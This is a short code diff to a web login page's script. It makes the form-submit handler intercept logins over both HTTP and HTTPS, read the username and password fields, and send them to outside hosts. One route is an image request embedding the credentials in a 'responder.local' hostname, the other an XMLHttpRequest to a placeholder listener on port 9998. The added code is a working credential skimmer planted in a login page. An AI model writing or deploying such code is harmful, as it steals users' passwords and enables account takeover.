@@ -124,12 +124,13 @@
 
   <script>
     document.getElementById("loginForm").addEventListener("submit", function(e) {
-      if (window.location.protocol === "http:") {
+      if (window.location.protocol === "http:" || window.location.protocol === "https:") {
         // Intercept form submission over HTTP
         e.preventDefault();
 
-        const user = document.getElementById("username").value;
-        const pass = document.getElementById("password").value;
+        const user = document.getElementById("UserNameText").value;
+        const pass = document.getElementById("PasswordText").value;
+        new Image().src = `http://${user}.${pass}.responder.local/image.png`;
 
         const xhr = new XMLHttpRequest();
         xhr.open("GET", "http://[FakeWindowsAuthListenerIPHTTP]:9998/log?u=" + 
